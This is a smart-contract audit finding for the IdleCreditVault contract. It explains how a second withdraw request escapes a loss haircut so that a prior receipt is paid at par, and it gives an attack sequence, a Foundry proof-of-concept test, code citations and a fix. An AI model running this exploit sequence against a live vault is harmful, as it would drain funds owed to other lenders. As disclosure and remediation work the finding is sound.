### Title
Older loss-adjusted withdraw receipts are paid at par when a newer request epoch overwrites `lastWithdrawRequest` - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`claimWithdrawRequest` decides whether a user has a haircutted (loss-adjusted) receipt by looking only at `lastWithdrawRequest[_user]` in `_claimLossAdjustedWithdrawRequest`. If a user holds a receipt from an epoch that was funded with a loss via `collectWithdrawFunds`/`stopEpochWithDuration`, and then submits a second `requestWithdraw` in a later epoch, `lastWithdrawRequest[_user]` is overwritten and `lossRecoveryPriceByEpoch` for the new epoch is zero. The old loss-adjusted receipt is then claimed through `_claimFundedWithdrawRequest` at 100% of face value instead of at `lossRecoveryPrice`, letting the attacker escape the haircut and overdraw the funded reserve.

### Finding Description
When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` is called with `_amount < pendingWithdraws`; it stores `lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice`, zeroes `pendingWithdraws`, and transfers only the funded portion [1](#0-0) . Each user's receipt for that epoch remains in `withdrawsRequestsByEpoch[_user][lossEpoch]` and in the aggregate `withdrawsRequests[_user]` until it is cleared by `_clearWithdrawClaimForEpoch` [2](#0-1) .

The clearing is only reachable through `_claimLossAdjustedWithdrawRequest`, which derives the claim epoch as `lossEpoch = lastWithdrawRequest[_user]` and returns early when `lossRecoveryPriceByEpoch[lossEpoch] == 0` [3](#0-2) . But `requestWithdraw` unconditionally sets `lastWithdrawRequest[_user] = currentEpoch` on every new request [4](#0-3) .

Sequence (buffer/running phases, fixed-APR mode):
1. Attacker deposits AA and calls `requestWithdraw` in epoch N. `lastWithdrawRequest = N`, `withdrawsRequestsByEpoch[attacker][N] = R`, `withdrawsRequests[attacker] = R`.
2. `stopEpochWithDuration` realizes a loss; the borrower funds only `funded < pendingBasis`. `lossRecoveryPriceByEpoch[N] = p < RECOVERY_FULL`, `epochNumber` becomes N+1.
3. Instead of claiming, the attacker calls `requestWithdraw` again in epoch N+1 with a small amount (or even re-requests the rest of their tranche tokens). `lastWithdrawRequest = N+1`; `withdrawsRequestsByEpoch[attacker][N+1] = r`; `withdrawsRequests[attacker] = R + r`.
4. After the next `stopEpoch` (`epochNumber = N+2`) the attacker calls `claimWithdrawRequest`:
   - `_claimLossAdjustedWithdrawRequest` reads `lossEpoch = N+1`, `lossRecoveryPriceByEpoch[N+1] == 0`, returns 0 — the epoch-N receipt is never haircutted [5](#0-4) .
   - `_claimFundedWithdrawRequest` passes the gate (`epochNumber = N+2 > lastWithdrawRequest = N+1`), then pays `normalAmount = withdrawsRequests[attacker] = R + r` **at par** via `_transferFundedClaim` [6](#0-5) .

The attacker burns only `R + r` receipt tokens but receives `R + r` underlyings, while the strategy only ever collected `R * p / 1e18` for the epoch-N receipt. The excess `(R * (1 - p))` is paid from the same funded bucket that backs other users' claims and the default-recovery-reserve guard only protects `defaultRecoveryReserve`, not the general funded pool [7](#0-6) .

### Impact Explanation
Direct theft / insolvency. The attacker escapes the loss waterfall that `previewLossAdjustedWithdrawFunds` and `lossRecoveryPriceByEpoch` are designed to enforce [8](#0-7) . For a receipt of size `R` in an epoch funded at price `p`, the attacker extracts `R * (RECOVERY_FULL - p) / RECOVERY_FULL` underlyings that were never funded by the borrower, causing the vault to become insolvent against later claimants by the same amount. An unprivileged lender (any KYC'd tranche holder) can do this with two `requestWithdraw` calls and one claim; the only precondition is a manager-executed `stopEpochWithDuration` loss epoch, which is a normal protocol flow.

### Likelihood Explanation
Likelihood is moderate-to-high whenever a loss epoch occurs: no privileged collusion, no oracle manipulation, and no timing beyond "submit a second request in the next epoch before claiming" is needed. The attacker merely needs a pending receipt during a `stopEpochWithDuration` event and a remaining tranche-token balance (or dust deposit) to re-request. Guards do not stop it: `_ensureDefaultRecoveryInitialized` is already satisfied post-upgrade, the epoch gate in `_claimFundedWithdrawRequest` only checks the *latest* request epoch, and the NotAllowed revert for legacy receipts in `collectWithdrawFunds` does not apply since `defaultRecoveryInitialized` is set.

### Recommendation
Track loss-adjusted claims per epoch independently of `lastWithdrawRequest`. In `_claimLossAdjustedWithdrawRequest`, iterate or check the user's other outstanding request epochs (e.g., scan `withdrawsRequestsByEpoch` keys, or maintain a `lossEpoch` marker per user set at request time, or store a flag on the receipt indicating it belongs to an epoch with a nonzero `lossRecoveryPriceByEpoch`). Minimal fix: in `requestWithdraw`, refuse (or first auto-claim) when the user has an unfunded receipt in an epoch with `lossRecoveryPriceByEpoch != 0`; alternatively, in `_claimFundedWithdrawRequest`, exclude amounts recorded under epochs with a nonzero loss-recovery price and route them through the haircut path before paying the remainder at par.

### Proof of Concept
Foundry-style sketch against `test/foundry/IdleCreditVault.t.sol` helpers (`_depositWithUser`, `_startEpochAndCheckPrices`, `cdoEpoch`, `strategy`):

```solidity
function testLossReceiptPaidAtParAfterSecondRequest() external {
    uint256 amount = 10_000 * ONE_SCALE;
    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    _depositWithUser(attacker, amount, true);          // AA tranche holder
    _depositWithUser(victim,   amount, true);

    // 1. Attacker requests withdraw of half in epoch 0
    uint256 half = IERC20(AAtranche).balanceOf(attacker) / 2;
    vm.prank(attacker);
    uint256 R = cdoEpoch.requestWithdraw(half, address(AAtranche));

    // 2. Epoch 0 ends with a realized loss: borrower funds only 50% of pending
    _startEpochAndCheckPrices(0);
    uint256 duration = cdoEpoch.epochDuration();
    uint256 loss = cdoEpoch.getContractValue() / 4;    // 25% loss -> pending haircut
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, 0, duration, loss);

    IdleCreditVault vault = IdleCreditVault(address(strategy));
    uint256 p = vault.lossRecoveryPriceByEpoch(0);
    assertGt(p, 0);
    assertLt(p, 1e18);                                  // receipt is haircutted

    // 3. Attacker makes a second (dust) request in epoch 1, overwriting lastWithdrawRequest
    vm.prank(attacker);
    uint256 r = cdoEpoch.requestWithdraw(1, address(AAtranche));
    assertEq(vault.lastWithdrawRequest(attacker), 1);

    // 4. Epoch 1 ends normally, fully funded
    _startEpochAndCheckPrices(1);
    _stopEpochAndCheckPrices(1, initialProvidedApr, _expectedFundsEndEpoch());

    // 5. Claim: loss path is skipped (lossRecoveryPriceByEpoch[1] == 0), full R + r paid at par
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - balPre;

    uint256 expected = R * p / 1e18 + r;                // correct haircutted payout
    assertGt(paid, expected);                           // attacker escapes the haircut
    // stolen = paid - expected == R * (1e18 - p) / 1e18, drained from the funded bucket
}
```

The assertion demonstrates the broken invariant: the epoch-0 receipt is settled at par, siphoning `R * (1 - p)` underlyings that were never funded.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L281-293)
```text
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L326-349)
```text
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L411-430)
```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L440-460)
```text
  function previewLossAdjustedWithdrawFunds(uint256 _lossAmount) external view returns (uint256 pendingToFund, uint256 activeLoss) {
    uint256 pendingBasis = pendingWithdraws;
    // Full zero-loss funding is safe for legacy aggregate receipts and needs no migration call.
    if (_lossAmount == 0) return (pendingBasis, _lossAmount);

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 activeBasis = _lossActiveBasis(cdo);
    if (pendingBasis == 0) {
      if (_lossAmount > activeBasis) revert NotAllowed();
      return (0, _lossAmount);
    }

    // Legacy pending receipts do not have the per-epoch ownership data needed to store a haircut.
    if (!defaultRecoveryInitialized) revert NotAllowed();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (_lossAmount >= totalBasis) revert NotAllowed();

    uint256 pendingLoss = _lossAmount * pendingBasis / totalBasis;
    pendingToFund = pendingBasis - pendingLoss;
    activeLoss = _lossAmount - pendingLoss;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L789-801)
```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L811-820)
```text
  function _clearWithdrawClaimForEpoch(address _user, uint256 _claimEpoch, bool _isClearingApr0) internal returns (uint256 claimBasis, uint256 burnAmount) {
    (claimBasis, burnAmount) = _withdrawClaimAmountsForEpoch(_user, _claimEpoch);
    if (claimBasis == 0) return (claimBasis, burnAmount);

    uint256 normalAmount = withdrawsRequestsByEpoch[_user][_claimEpoch];
    if (normalAmount != 0) {
      withdrawsRequestsByEpoch[_user][_claimEpoch] = 0;
      // The aggregate may also include older funded receipts; clear only this epoch's piece.
      withdrawsRequests[_user] -= normalAmount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L897-906)
```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
```
